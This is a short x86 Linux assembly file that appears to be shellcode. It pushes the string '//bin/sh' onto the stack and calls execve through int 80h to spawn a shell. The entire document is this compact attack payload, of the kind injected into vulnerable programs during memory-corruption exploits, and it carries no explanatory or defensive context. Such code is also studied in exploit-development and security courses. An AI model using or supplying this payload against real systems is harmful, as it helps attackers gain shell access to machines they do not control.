section .text
    global _start

_start:
    xor ecx, ecx 
    mul ecx         ; zero out EAX and EDX as a result of multiplication
    push ecx 
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp        ; put string address into ebx
    mov al, 11
    int 80h 

